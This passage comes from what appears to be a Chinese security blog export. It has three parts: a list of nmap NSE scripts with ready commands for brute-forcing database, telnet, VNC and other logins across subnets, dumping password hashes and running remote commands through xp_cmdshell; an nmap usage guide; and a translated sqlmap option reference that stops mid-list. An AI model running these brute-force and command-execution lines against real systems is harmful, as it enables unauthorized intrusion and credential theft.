informix-brute.nse 192.168.3.23 mysql-empty-password.nse mysql 扫描root空密码 1mysql-empty-password.nse mysql 扫描root空密码 mysql-brute.nse mysql root弱口令简单爆破 1# nmap -p 3306 –script mysql-brute.nse -v 192.168.3.23 mysql-dump-hashes.nse 导出mysql中所有用户的hash 1# nmap -p 3306 –script mysql-dump-hashes –script-args=’username=root,password=root’ 192.168.3.23 mysql-vuln-cve2012-2122.nse Mysql身份认证漏洞[MariaDB and MySQL 5.1.61,5.2.11, 5.3.5, 5.5.22],利用条件有些苛刻 [需要目标的mysql是自己源码编译安装的,这样的成功率相对较高] 1# nmap -p 3306 –script mysql-vuln-cve2012-2122.nse -v 192.168.3.23 1nmap -p 445 –script ms-sql-info.nse -v 203.124.11.0/24 ms-sql-info.nse 扫描C段mssql 1# nmap -p 1433 –script ms-sql-info.nse –script-args mssql.instance-port=1433 -v 192.168.3.0/24 ms-sql-empty-password.nse 扫描mssql sa空密码 1# nmap -p 1433 –script ms-sql-empty-password.nse -v 192.168.3.0/24 ms-sql-brute.nse sa弱口令爆破 1# nmap -p 1433 –script ms-sql-brute.nse -v 192.168.3.0/24 ms-sql-xp-cmdshell.nse 利用xp_cmdshell,远程执行系统命令 1# nmap -p 1433 –script ms-sql-xp-cmdshell –script-args mssql.username=sa,mssql.password=sa,ms-sql-xp-cmdshell.cmd=“net user test test /add” 192.168.3.0/24 ms-sql-dump-hashes.nse 导出mssql中所有的数据库用户及密码hash 1# nmap -p 1433 –script ms-sql-dump-hashes -v 192.168.3.0/24 pgsql-brute.nse 尝试爆破postgresql 1# nmap -p 5432 –script pgsql-brute -v 192.168.3.0/24 oracle-brute-stealth.nse 尝试爆破oracle 1# nmap –script oracle-brute-stealth -p 1521 –script-args oracle-brute-stealth.sid=ORCL -v 192.168.3.0/24 oracle-brute.nse 1# nmap –script oracle-brute -p 1521 –script-args oracle-brute.sid=ORCL -v 192.168.3.0/24 mongodb-brute.nse 尝试爆破mongdb 1# nmap -p 27017 –script mongodb-brute 192.168.3.0/24 redis-brute.nse redis爆破 1# nmap -p 6379 –script redis-brute.nse 192.168.3.0/24 和snmp相关的一些扫描脚本:snmp-brute.nse 爆破C段的snmp 1# nmap -sU –script snmp-brute –script-args snmp-brute.communitiesdb=user.txt 192.168.3.0/24 和telnet相关的一些扫描脚本:telnet-brute.nse 简单爆破telnet 1# nmap -p 23 –script telnet-brute –script-args userdb=myusers.lst,passdb=mypwds.lst,telnet-brute.timeout=8s -v 192.168.3.0/24 和ldap服务相关的一些利用脚本:ldap-brute.nse 简单爆破ldap 1# nmap -p 389 –script ldap-brute –script-args ldap.base=’“cn=users,dc=cqure,dc=net”‘ 192.168.3.0/24 和各类web中间件,web集成环境相关的一些利用脚本:xmpp-brute.nse xmpp爆破 1# nmap -p 5222 –script xmpp-brute.nse 192.168.3.0/24 http-iis-short-name-brute.nse 短文件扫描 1# nmap -p80 –script http-iis-short-name-brute.nse 192.168.3.0/24 http-iis-webdav-vuln.nse iis 5.0 /6.0 webadv写 1# nmap –script http-iis-webdav-vuln.nse -p80,8080 192.168.3.0/24 http-shellshock.nse bash远程执行 1# nmap -sV -p- –script http-shellshock –script-args uri=/cgi-bin/bin,cmd=ls 192.168.3.0/24 http-svn-info.nse 探测目标svn 1# nmap –script http-svn-info 192.168.3.0/24 http-drupal-enum.nse 其实对于这类的开源程序,我们根本没必要用nmap,因为搞多了,差不多一眼就能看出来 http-wordpress-brute.nse 1# nmap -p80 -sV –script http-wordpress-brute –script-args ‘userdb=users.txt,passdb=passwds.txt,http-wordpress-brute.hostname=domain.com,http-wordpress-brute.threads=3,brute.firstonly=true’ 192.168.3.0/24 http-backup-finder.nse 扫描目标网站备份 1# nmap -p80 –script=http-backup-finder 192.168.3.0/24 http-vuln-cve2015-1635.nse iis6.0远程代码执行 1# nmap -sV –script http-vuln-cve* –script-args uri=’/anotheruri/’ 192.168.3.0/24 跟vpn相关的一些利用脚本pptp-version.nse 识别目标pptp版本 1# nmap -p 1723 –script pptp-version.nse 192.168.3.0/24 smb漏洞检测脚本集: smb-vuln-ms08-067.nse smb-vuln-ms10-054.nse smb-vuln-ms10-061.nse smb-vuln-ms17-010.nse smb远程执行 1# nmap -p445 –script smb-vuln-ms17-010.nse 192.168.3.0/24 检测内网嗅探sniffer-detect.nse 1# nmap -sn -Pn –script sniffer-detect.nse 192.168.3.0/24 其它的一些辅助性脚本:rsync-brute.nse 爆破目标的rsync 1# nmap -p 873 –script rsync-brute –script-args ‘rsync-brute.module=www’ 192.168.3.0/24 rlogin-brute.nse 爆破目标的rlogin 1# nmap -p 513 –script rlogin-brute 192.168.3.0/24 vnc-brute.nse 爆破目标的vnc 1# nmap –script vnc-brute -p 5900 192.168.3.0/24 pcanywhere-brute.nse 爆破pcanywhere 1# nmap -p 5631 –script=pcanywhere-brute 192.168.3.0/24 nessus-brute.nse 爆破nessus,貌似现在已经不是1241端口了,实在是太老了,直接忽略吧 1# nmap –script nessus-brute -p 1241 192.168.3.0/24 nexpose-brute.nse 爆破nexpose 1# nmap –script nexpose-brute -p 3780 192.168.0.0/24 shodan-api.nse 配合shodan接口进行扫描,如果自己手里有0day,这个威力还是不可小觑的 1# nmap –script shodan-api –script-args ‘shodan-api.target=192.168.0.0/24,shodan-api.apikey=SHODANAPIKEY’ 0x17 尝试利用nmap一句话进行目标C段常规漏洞扫描 实际测试中,会非常的慢,可能跑一个脚本验证时间都要很长,尤其在你的vps带宽不是很足,网络又不怎么好的时候,速度就更慢了,所以还是建议先大致扫一眼目标服务,然后再单独针对性的扫,这样实际的成功率可能会高很多,毕竟,不是像masscan或者zamp这种基于无状态的扫描: 1# nmap -sT -Pn -v –script dns-zone-transfer.nse,ftp-anon.nse,ftp-proftpd-backdoor.nse,ftp-vsftpd-backdoor.nse,ftp-vuln-cve2010-4221.nse,http-backup-finder.nse,http-cisco-anyconnect.nse,http-iis-short-name-brute.nse,http-put.nse,http-php-version.nse,http-shellshock.nse,http-robots.txt.nse,http-svn-enum.nse,http-webdav-scan.nse,iis-buffer-overflow.nse,iax2-version.nse,memcached-info.nse,mongodb-info.nse,msrpc-enum.nse,ms-sql-info.nse,mysql-info.nse,nrpe-enum.nse,pptp-version.nse,redis-info.nse,rpcinfo.nse,samba-vuln-cve-2012–1182.nse,smb-vuln-ms08-067.nse,smb-vuln-ms17-010.nse,snmp-info.nse,sshv1.nse,xmpp-info.nse,tftp-enum.nse,teamspeak2-version.nse 192.168.3.0/24 尝试利用nmap一句话进行目标C段弱口令爆破,还是上面的问题,验证一个漏洞都要那么久,更不要说跑完一个弱口令字典,nmap默认的弱口令字典大概是5000左右,也就是说一个用户名就要跑大概5000次,估计你vps带宽再小点儿的话,这个就没什么谱了,毕竟我们是在公网,不是在内网,所以,还是建议最好不要同时加载很多个弱口令爆破脚本,如果实在没办法必须爆破,可以多花点儿时间,去搜集目标有价值的用户名,以此尽可能提高自己的命中率: 1# nmap -sT -v -Pn –script ftp-brute.nse,imap-brute.nse,smtp-brute.nse,pop3-brute.nse,mongodb-brute.nse,redis-brute.nse,ms-sql-brute.nse,rlogin-brute.nse,rsync-brute.nse,mysql-brute.nse,pgsql-brute.nse,oracle-sid-brute.nse,oracle-brute.nse,rtsp-url-brute.nse,snmp-brute.nse,svn-brute.nse,telnet-brute.nse,vnc-brute.nse,xmpp-brute.nse 192.168.0.0/24]]></content>
      <categories>
        <category>hacker</category>
      </categories>
      <tags>
        <tag>tool</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nmap基本使用]]></title>
    <url>%2F2019%2F9%2Fnmap%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[前言Nmap 是个端口扫描器，这意味着它可以向一些指定 IP 的 TCP 或 UDP 端口发送封包，并检查是否有响应。如果有的话，这意味着端口是打开的，因此，端口上运行着服务 Nmap代表Network Mapper，是一款用于网络探索和安全审计的开源工具，它与Kali Linux标准兼容，但也可用于Windows，OSX和许多其他UNIX平台。Nmap还有一个称为Zenmap的图形用户界面。 打开端口扫描和操作系统检测使用以下命令确定活动主机： 1nmap -sP 192.168.0.0-100 使用以下命令在其中一个实时主机上启动带有操作系统检测的SYN扫描 1nmap -sS [IP地址] -O 使用以下命令启动一个开放端口扫描和版本检测 1nmap -sV 192.168.0.1 -A 将-v添加到命令中时，可以增加冗长度 1nmap -sV 192.168.0.13 -A -v 服务器是否响应 ping，或者服务器是否打开使用-sn参数，我们让 Nmap 只检查是否服务器响应 ICMP 请求（或 ping） 1nmap -sn 192.168.56.102 打开了哪些端口调用 Nmap 的最简方式，它只指定目标 IP。所做的事情是先 ping 服务器，如果它响应了，Nmap 会向 1000 个 TCP 端口列表发送探针，来观察哪个端口响应，之后报告响应端口的结果 1nmap 192.168.56.102 Nmap 向服务器询问正在运行的服务的版本，并且基于它猜测操作系统 sV请求每个被发现的开放端口的标识（头部或者自我识别），这是它用作版本的东西。 O告诉 Nmap，尝试猜测运行在目标上的操作系统。使用开放端口和版本收集的信息。 1nmap -sV -O 192.168.56.10 更加清楚的查看这个端口，并且看看可以确认什么使用此命令，让 nmap 在主机上的 FTP 端口（-p 21）上运行其默认脚本（-sC） 1nmap -sC 192.168.56.102 -p 21 Nmap 包含了一些脚本，用于测试 WAF 的存在1map -p 80,443 --script=http-waf-detect 192.168.56.102 另一个 Nmap 脚本，可以帮助我们识别所使用的设备，并更加精确1nmap -p 80,443 --script=http-waf-fingerprint www.example.com 有一些其它的实用参数： sT：通常，在 root 用户下运行 Nmap 时，它使用 SYN 扫描类型。使用这个参数，我们就强制让扫描器执行完全连接的扫描。它更慢，并且会在服务器的日志中留下记录，但是它不太可能被入侵检测系统检测到。 Pn：如果我们已经知道了主机是活动的或者不响应 ping，我们可以使用这个参数告诉 Nmap 跳过 ping 测试，并扫描所有指定目标，假设它们是开启的。 v：这会开启详细模式。Nmap 会展示更多关于它所做事情和得到回复的信息。参数可以在相同命令中重复多次：次数越多，就越详细（也就是说，-vv或-v -v -v -v）。 p N1,N2,Nn：如果我们打算测试特定端口或一些非标准端口，我们可能想这个参数。N1到Nn是打算让 Nmap 扫描的端口。例如，要扫描端口 21，80 到 90，和 137，参数应为：-p 21,80-90,137。 –script=script_name：Nmap 包含很多实用的漏洞检测、扫描和识别、登录测试、命令执行、用户枚举以及其它脚本。使用这个参数来告诉 Nmap 在目标的开放端口上运行脚本。查看一些 Nmap 脚本，它们在：https://nmap.org/nsedoc/scripts/。 Nmap选项摘要用法：nmap [扫描类型] [选项] {目标规格} 目标规格：可以传递主机名，IP地址，网络等。例如：scanme.nmap.org，microsoft.com/24,192.168.0.1; 10.0.0-255.1-254 -iL ：从主机/网络列表中输入 -iR ：选择随机目标 -exclude ：排除主机/网络 -excludefile &lt;exclude_file&gt;：从文件中排除列表 主机发现： -sL：列表扫描 – 仅列出要扫描的目标 -sn：Ping扫描 – 禁用端口扫描 -Pn：将所有主机视为联机 – 跳过主机发现 -PS / PA / PU / PY [portlist]：TCP SYN / ACK / UDP / SCTP发现到指定端口 -PE / PP / PM：ICMP回显，时间戳和网络掩码请求发现探测 -PO [协议列表]：IP协议Ping -n / -R：从不执行DNS解析/总是解析[默认：有时] -dns-servers ：指定自定义DNS服务器 -system-dns：使用操作系统的DNS解析器 -traceroute：每个主机的跟踪跳转路径 SCAN技术： -sS / sT / sA / sW / sM：TCP SYN / Connect（）/ ACK / Window / Maimon扫描 -sU：UDP 扫描-sN / sF / sX：TCP Null，FIN和Xmas扫描 –scanflags &lt; flags&gt;：自定义TCP扫描标志 -sI ：空闲扫描 -sY / sZ：SCTP INIT / COOKIE-ECHO扫描 -sO：IP协议扫描 -b &lt;FTP中继主机&gt;：FTP反弹扫描 端口规格和扫描 顺序：-p&lt;端口范围&gt;：仅扫描指定的端口 例如：-p22; -p1-65535; -p U：53,111,137，T：21-25,80,139,8080，S：9 -exclude-ports &lt;端口范围&gt;：从扫描中排除指定端口 -F：快速模式 – 扫描端口少于默认扫描 -r：连续扫描端口 – 不随机化 -top-ports ：扫描最常用的端口 -port-ratio ：扫描比 服务/版本检测： -sV：探测开放端口以确定服务/版本info -version-intensity ：设置从0（亮）到9（尝试所有探测器） -version-light：限制最可能的探测器2） -version-all：尝试每个探测器（强度9） -version-trace：显示详细版本的扫描活动（用于调试） SCRIPT SCAN： -sC：相当于-script =默认 -script = &lt;Lua脚本&gt;：是逗号分隔的 目录列表，脚本文件或脚本类别 -script-args = ：为脚本提供参数 -script-args-file = filename：在文件中提供NSE脚本参数 -script-trace：显示所有发送和接收的数据 -script-updatedb：更新脚本数据库。 -script-help = ：显示有关脚本的帮助。 是脚本文件或 脚本类别的逗号分隔列表。 操作系统检测： -O：启用操作系统检测 -osscan-limit：限制操作系统检测为有前途的目标 -osscan-guess：猜测操作系统更积极 时间和性能： 采用&lt;time&gt;的选项以秒为单位，或附加’ms’（毫秒），‘s’（秒），’m’（分钟）或’h’（小时） ）。 -T ：设置定时模板（更高更快） -min-hostgroup / max-hostgroup ：并行主机扫描组大小 -min-parallelism / max-parallelism ：探针并行化 -min- rtt-timeout / max-rtt-timeout / initial-rtt-timeout ：指定 探测往返时间。 -max-retries ：端口扫描探测器重新传输的大小数量。 -host-timeout ：在这个long -scan-delay 之后放弃目标/ -max-scan-delay ：调整探针之间的延迟 -min-rate ： -max-rate ：发送数据包不超过每秒 防火墙/ IDS消除和防盗： -f; -mtu ：片段数据包（可选w / given MTU） -D &lt;decoy1，decoy2 [，ME]，…&gt;：用诱饵隐藏扫描 -S &lt;IP_Address&gt;：欺骗源地址 -e ：使用指定的接口 -g / -source-port &lt; portnum &gt;：使用给定的端口号-proxies &lt;url1，[url2]，…&gt;：通过HTTP / SOCKS4代理服务器的中继连接 -data &lt;十六进制字符串&gt;：将自定义有效内容附加到已发送数据包 -data-string ：将自定义ASCII字符串附加到已发送数据包 -data-length ：将随机数据附加到已发送数据包 -ip-options &lt;选项&gt;：发送指定ip选项的数据包 -ttl ：设置IP生存时间字段 -spoof-mac &lt; -badsum：发送虚假TCP / UDP / SCTP校验和的数据包 OUTPUT -oN / -oX / -oS / -oG ：分别以正常，XML，s | &lt;rIpt kIddi3 和Grepable格式输出扫描到给定的文件名。 -oA ：一次输出三种主要格式 -v：提高详细级别（使用-vv或更多以获得更大效果） -d：提高调试级别（使用-dd或更多以获得更大效果） -reason：Display端口处于特定状态的原因 -open：只显示打开的（或可能打开的）端口 -packet-trace：显示所有发送和接收的数据包 -iflist：打印主机接口和路由（用于调试） -log-errors：Log错误/警告到正常格式的输出文件 -append-output：附加到指定的输出文件而不是clobber -resume ：恢复中止的扫描 -stylesheet &lt;path / URL&gt;：XSL样式表将XML输出转换为HTML -webxml：Nmap.Org的参考样式表，用于更多可移植的XML -no-stylesheet：防止关联XSL样式表w / XML输出 MISC： -6：启用IPv6扫描 -A：启用OS检测，版本检测，脚本扫描和traceroute -datadir ：指定自定义Nmap数据文件位置 -send-eth / -send-ip：使用原始以太网帧进行发送或IP数据包 -privileged：假设用户具有完全特权 -unprivileged：假定用户缺少原始套接字权限 -V：打印版本号 -h：打印此帮助摘要页面 另见虽然它最为流行，但是 Nmap 不是唯一可用的端口扫描器，并且，取决于不同的喜好，可能也不是最好的。下面是 Kali 中包含的一些其它的替代品： unicornscan hping3 masscan amap Metasploit scanning module]]></content>
      <categories>
        <category>hacker</category>
      </categories>
      <tags>
        <tag>tool</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sqlmap基本使用]]></title>
    <url>%2F2019%2F9%2Fsqlmap%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[前言SQLMap 是一个开源的渗透测试工具，可以用来进行自动化检测，利用 SQL 注入漏洞，获取数据库服务器的权限。它具有功能强大的检测引擎，针对各种不同类型数据库的渗透测试的功能选项，包括获取数据库中存储的数据，访问操作系统文件甚至可以通过外带数据连接的方式执行操作系统命令。 Options（选项）123456789101112131415Usage: python sqlmap.py [options]Options（选项）:-h, --help Show basic help message and exit## 展示帮助文档 参数-hh Show advanced help message and exit## 展示详细帮助文档参数--version Show program's version number and exit## 显示程序的版本号-v VERBOSE Verbosity level: 0-6 (default 1)## 详细级别：0-6（默认为1） Target（目标）123456789101112131415161718192021222324252627Target（目标）:At least one of these options has to be provided to define the target(s)-d DIRECT Connection string for direct database connection## 指定具体数据库-u URL, --url=URL Target URL (e.g. "http://www.site.com/vuln.php?id=1")## 目标URL-l LOGFILE Parse target(s) from Burp or WebScarab proxy log file## 解析目标(s)从Burp或WebScarab代理日志文件-x SITEMAPURL Parse target(s) from remote sitemap(.xml) file## 解析目标(s)从远程站点地图文件(.xml)-m BULKFILE Scan multiple targets given in a textual file## 扫描文本文件中给出的多个目标-r REQUESTFILE Load HTTP request from a file## 从本地文件加载HTTP请求 ，多用于post注入。-g GOOGLEDORK Process Google dork results as target URLs## 处理Google的结果作为目标URL。-c CONFIGFILE Load options from a configuration INI file## 从INI配置文件中加载选项。 Request（请求）123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120Request（请求）:​These options can be used to specify how to connect to the target URL## 这些选项可以用来指定如何连接到目标URL。​--method=METHOD Force usage of given HTTP method (e.g. PUT)## 强制使用给定的HTTP方法（e.g. PUT）​--data=DATA Data string to be sent through POST## 通过POST发送的数据字符串​--param-del=PARA.. Character used for splitting parameter values## 用于拆分参数值的字符​--cookie=COOKIE HTTP Cookie header value HTTP## Cookie头的值​--cookie-del=COO.. Character used for splitting cookie values## 用于分割Cookie值的字符--load-cookies=L.. File containing cookies in Netscape/wget format## 包含Netscape / wget格式的cookie的文件--drop-set-cookie Ignore Set-Cookie header from response## 从响应中忽略Set-Cookie头--user-agent=AGENT HTTP User-Agent header value## 指定 HTTP User - Agent头--random-agent Use randomly selected HTTP User-Agent header value## 使用随机选定的HTTP User - Agent头--host=HOST HTTP Host header value## HTTP主机头值--referer=REFERER HTTP Referer header value## 指定 HTTP Referer头-H HEADER, --hea.. Extra header (e.g. "X-Forwarded-For: 127.0.0.1")## 额外header--headers=HEADERS Extra headers (e.g. "Accept-Language: fr\\nETag: 123")## 额外header--auth-type=AUTH.. HTTP authentication type (Basic, Digest, NTLM or PKI)HTTP## 认证类型(Basic, Digest, NTLM or PKI)--auth-cred=AUTH.. HTTP authentication credentials (name:password)## HTTP认证凭证(name:password)--auth-file=AUTH.. HTTP authentication PEM cert/private key file## HTTP认证 PEM认证/私钥文件--ignore-401 Ignore HTTP Error 401 (Unauthorized)## 忽略HTTP错误401--proxy=PROXY Use a proxy to connect to the target URL## 使用代理连接到目标网址--proxy-cred=PRO.. Proxy authentication credentials (name:password)## 代理认证证书(name:password)--proxy-file=PRO.. Load proxy list from a file## 从文件中加载代理列表--ignore-proxy Ignore system default proxy settings## 忽略系统默认代理设置--tor Use Tor anonymity network## 使用Tor匿名网络--tor-port=TORPORT Set Tor proxy port other than default## 设置Tor代理端口而不是默认值--tor-type=TORTYPE Set Tor proxy type (HTTP (default), SOCKS4 or SOCKS5)## 设置Tor代理类型--check-tor Check to see if Tor is used properly## 检查Tor是否正确使用--delay=DELAY Delay in seconds between each HTTP request## 每个HTTP请求之间的延迟（秒）--timeout=TIMEOUT Seconds to wait before timeout connection (default 30)## 秒超时连接前等待（默认30）--retries=RETRIES Retries when the connection timeouts (default 3)## 连接超时时重试（默认值3）--randomize=RPARAM Randomly change value for given parameter(s)## 随机更改给定参数的值(s)--safe-url=SAFEURL URL address to visit frequently during testing## 在测试期间频繁访问的URL地址--safe-post=SAFE.. POST data to send to a safe URL## POST数据发送到安全URL--safe-req=SAFER.. Load safe HTTP request from a file## 从文件加载安全HTTP请求--safe-freq=SAFE.. Test requests between two visits to a given safe URL## 在两次访问给定安全网址之间测试请求--skip-urlencode Skip URL encoding of payload data## 跳过有效载荷数据的URL编码--csrf-token=CSR.. Parameter used to hold anti-CSRF token## 参数用于保存anti-CSRF令牌--csrf-url=CSRFURL URL address to visit to extract anti-CSRF token## 提取anti-CSRF URL地址访问令牌--force-ssl Force usage of SSL/HTTPS## 强制使用SSL /HTTPS--hpp Use HTTP parameter pollution method## 使用HTTP参数pollution的方法--eval=EVALCODE Evaluate provided Python code before the request (e.g. 评估请求之前提供Python代码"import hashlib;id2=hashlib.md5(id).hexdigest()") Optimization（优化）12345678910111213141516171819Optimization（优化）:​These options can be used to optimize the performance of sqlmap## 这些选项可用于优化sqlmap的性能​-o Turn on all optimization switches## 开启所有优化开关​--predict-output Predict common queries output## 预测常见的查询输出​--keep-alive Use persistent HTTP(s) connections## 使用持久的HTTP（S）连接​--null-connection Retrieve page length without actual HTTP response body## 从没有实际的HTTP响应体中检索页面长度​--threads=THREADS Max number of concurrent HTTP(s) requests (default 1)## 最大的HTTP（S）请求并发量（默认为1） Injection（注入）12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849Injection（注入）:​These options can be used to specify which parameters to test for, provide custom injection payloads and optional tampering scripts## 这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。​-p TESTPARAMETER Testable parameter(s)## 可测试的参数（S）​--skip=SKIP Skip testing for given parameter(s)## 跳过对给定参数的测试​--skip-static Skip testing parameters that not appear to be dynamic## 跳过测试不显示为动态的参数​--param-exclude=.. Regexp to exclude parameters from testing (e.g. "ses")## 使用正则表达式排除参数进行测试（e.g. "ses"）​--dbms=DBMS Force back-end DBMS to this value## 强制后端的DBMS为此值​--dbms-cred=DBMS.. DBMS authentication credentials (user:password)## DBMS认证凭证(user:password)​--os=OS Force back-end DBMS operating system to this value## 强制后端的DBMS操作系统为这个值​--invalid-bignum Use big numbers for invalidating values## 使用大数字使值无效​--invalid-logical Use logical operations for invalidating values## 使用逻辑操作使值无效​--invalid-string Use random strings for invalidating values## 使用随机字符串使值无效​--no-cast Turn off payload casting mechanism## 关闭有效载荷铸造机制​--no-escape Turn off string escaping mechanism## 关闭字符串转义机制​--prefix=PREFIX Injection payload prefix string## 注入payload字符串前缀​--suffix=SUFFIX Injection payload suffix string## 注入payload字符串后缀​--tamper=TAMPER Use given script(s) for tampering injection data## 使用给定的脚本（S）篡改注入数据 Detection（检测）123456789101112131415161718192021222324252627Detection（检测）:These options can be used to customize the detection phase## 这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。​--level=LEVEL Level of tests to perform (1-5, default 1)## 执行测试的等级（1-5，默认为1）​--risk=RISK Risk of tests to perform (1-3, default 1)## 执行测试的风险（0-3，默认为1）​--string=STRING String to match when query is evaluated to True## 查询时有效时在页面匹配字符串​--not-string=NOT.. String to match when query is evaluated to False## 当查询求值为无效时匹配的字符串​--regexp=REGEXP Regexp to match when query is evaluated to True## 查询时有效时在页面匹配正则表达式​--code=CODE HTTP code to match when query is evaluated to True## 当查询求值为True时匹配的HTTP代码​--text-only Compare pages based only on the textual content## 仅基于在文本内容比较网页​--titles Compare pages based only on their titles## 仅根据他们的标题进行比较 Techniques（技巧）123456789101112131415161718192021222324Techniques（技巧）:These options can be used to tweak testing of specific SQL injection techniques## 这些选项可用于调整具体的SQL注入测试。​--technique=TECH SQL injection techniques to use (default "BEUSTQ")## SQL 注入技术测试（默认BEUST）​--time-sec=TIMESEC Seconds to delay the DBMS response (default 5)## DBMS响应的延迟时间（默认为5秒）​--union-cols=UCOLS Range of columns to test for UNION query SQL injection## 定列范围用于测试UNION查询注入​--union-char=UCHAR Character to use for bruteforcing number of columns## 用于暴力猜解列数的字符​--union-from=UFROM Table to use in FROM part of UNION query SQL injection## 要在UNION查询SQL注入的FROM部分使用的表​--dns-domain=DNS.. Domain name used for DNS exfiltration attack## 域名用于DNS漏出攻击​--second-order=S.. Resulting page URL searched for second-order response## 生成页面的URL搜索为second-order响应 Fingerprint（指纹）1234Fingerprint（指纹）:​-f, --fingerprint Perform an extensive DBMS version fingerprint## 执行检查广泛的DBMS版本指纹 Enumeration（枚举）123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106Enumeration（枚举）:​These options can be used to enumerate the back-end database management system information, structure and data contained in the tables. Moreover you can run your own SQL statements## 这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行您自己的SQL语句。​-a, --all Retrieve everything## 检索一切​-b, --banner Retrieve DBMS banner## 检索数据库管理系统的标识​--current-user Retrieve DBMS current user## 检索数据库管理系统的 标识​--current-db Retrieve DBMS current database## 检索数据库管理系统当前数据库​-hostname Retrieve DBMS server hostname## 检索数据库服务器的主机名​--is-dba Detect if the DBMS current user is DBA## 检测DBMS当前用户是否DBA​--users Enumerate DBMS users## 枚举数据库管理系统用户​--passwords Enumerate DBMS users password hashes## 枚举数据库管理系统用户密码哈希​--privileges Enumerate DBMS users privileges## 枚举数据库管理系统用户的权限​--roles Enumerate DBMS users roles## 枚举数据库管理系统用户的角色​--dbs Enumerate DBMS databases## 枚举数据库管理系统数据库​--tables Enumerate DBMS database tables## 枚举的DBMS数据库中的表​--columns Enumerate DBMS database table columns## 枚举DBMS数据库表列​--schema Enumerate DBMS schema## 枚举数据库架构​--count Retrieve number of entries for table(s)## 检索表的条目数​--dump Dump DBMS database table entries## 转储数据库管理系统的数据库中的表项​--dump-all Dump all DBMS databases tables entries## 转储数据库管理系统的数据库中的表项​--search Search column(s), table(s) and/or database name(s)## 搜索列（S），表（S）和/或数据库名称（S）​--comments Retrieve DBMS comments## 检索数据库的comments(注释、评论)​-D DB DBMS database to enumerate## 要进行枚举的数据库名​-T TBL DBMS database table(s) to enumerate## 要进行枚举的数据库表​-C COL DBMS database table column(s) to enumerate## 要进行枚举的数据库列​-X EXCLUDECOL DBMS database table column(s) to not enumerate## 要不进行枚举的数据库列​-U USER DBMS user to enumerate## 用来进行枚举的数据库用户​--exclude-sysdbs Exclude DBMS system databases when enumerating tables## 枚举表时排除系统数据库​--pivot-column=P.. Pivot column name## 主列名称​--where=DUMPWHERE Use WHERE condition while table dumping## 使用WHERE条件进行表转储​--start=LIMITSTART First query output entry to retrieve## 第一个查询输出进入检索​--stop=LIMITSTOP Last query output entry to retrieve## 最后查询的输出进入检索​--first=FIRSTCHAR First query output word character to retrieve## 第一个查询输出字的字符检索​--last=LASTCHAR Last query output word character to retrieve## 最后查询的输出字字符检索​--sql-query=QUERY SQL statement to be executed## 要执行的SQL语句​--sql-shell Prompt for an interactive SQL shell## 提示交互式SQL的shell​--sql-file=SQLFILE Execute SQL statements from given file(s)## 从给定文件执行SQL语句 Brute Force（蛮力）12345678910Brute force（蛮力）:​These options can be used to run brute force checks## 这些选项可以被用来运行蛮力检查。​--common-tables Check existence of common tables## 检查存在共同表​--common-columns Check existence of common columns## 检查存在共同列 User-defined function injection（用户自定义函数注入）12345678910User-defined function injection（用户自定义函数注入）:​These options can be used to create custom user-defined functions## 这些选项可以用来创建用户自定义函数。​--udf-inject Inject custom user-defined functions## 注入用户自定义函数​--shared-lib=SHLIB Local path of the shared library## 共享库的本地路径 File system access（访问文件系统）123456789101112File system access（访问文件系统）:These options can be used to access the back-end database management system underlying file system## 这些选项可以被用来访问后端数据库管理系统的底层文件系统。​--file-read=RFILE Read a file from the back-end DBMS file system## 从后端的数据库管理系统文件系统读取文件​--file-write=WFILE Write a local file on the back-end DBMS file system## 编辑后端的数据库管理系统文件系统上的本地文件​--file-dest=DFILE Back-end DBMS absolute filepath to write to## 后端的数据库管理系统写入文件的绝对路径 Operating system access（操作系统访问）12345678910111213141516171819202122232425262728Operating system access（操作系统访问）:​These options can be used to access the back-end database management system underlying operating system## 这些选项可以用于访问后端数据库管理系统的底层操作系统。​--os-cmd=OSCMD Execute an operating system command## 执行操作系统命令​--os-shell Prompt for an interactive operating system shell## 交互式的操作系统的shell​--os-pwn Prompt for an OOB shell, Meterpreter or VNC## 获取一个OOB shell，meterpreter或VNC​--os-smbrelay One click prompt for an OOB shell, Meterpreter or VNC## 一键获取一个OOB shell，meterpreter或VNC​--os-bof Stored procedure buffer overflow exploitation## 存储过程缓冲区溢出利用​--priv-esc Database process user privilege escalation## 数据库进程用户权限提升​--msf-path=MSFPATH Local path where Metasploit Framework is installed Metasploit Framework## 本地的安装路径​--tmp-path=TMPPATH Remote absolute path of temporary files directory## 远程临时文件目录的绝对路径 Windows registry access（Windows注册表访问）12345678910111213141516171819202122232425Windows registry access（Windows注册表访问）:​These options can be used to access the back-end database management system Windows registry## 这些选项可以被用来访问后端数据库管理系统Windows注册表。​--reg-read Read a Windows registry key value## 读一个Windows注册表项值​--reg-add Write a Windows registry key value data## 写一个Windows注册表项值数据​--reg-del Delete a Windows registry key value## 删除Windows注册表键值​--reg-key=REGKEY Windows registry key## Windows注册表键​--reg-value=REGVAL Windows registry key value## Windows注册表项值​--reg-data=REGDATA Windows registry key value data## Windows注册表键值数据​--reg-type=REGTYPE Windows registry key value type## Windows注册表项值类型 General（一般）12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667General（一般）:​These options can be used to set some general working parameters## 这些选项可以用来设置一些一般的工作参数。​-s SESSIONFILE Load session from a stored (.sqlite) file## 保存和恢复检索会话文件的所有数据​-t TRAFFICFILE Log all HTTP traffic into a textual file## 记录所有HTTP流量到一个文本文件中​--batch Never ask for user input, use the default behaviour## 从不询问用户输入，使用所有默认配置。​--binary-fields=.. Result fields having binary values (e.g. "digest")## 具有二进制值的结果字段​--charset=CHARSET Force character encoding used for data retrieval## 强制用于数据检索的字符编码​--crawl=CRAWLDEPTH Crawl the website starting from the target URL## 从目标网址开始抓取网站​--crawl-exclude=.. Regexp to exclude pages from crawling (e.g. "logout")## 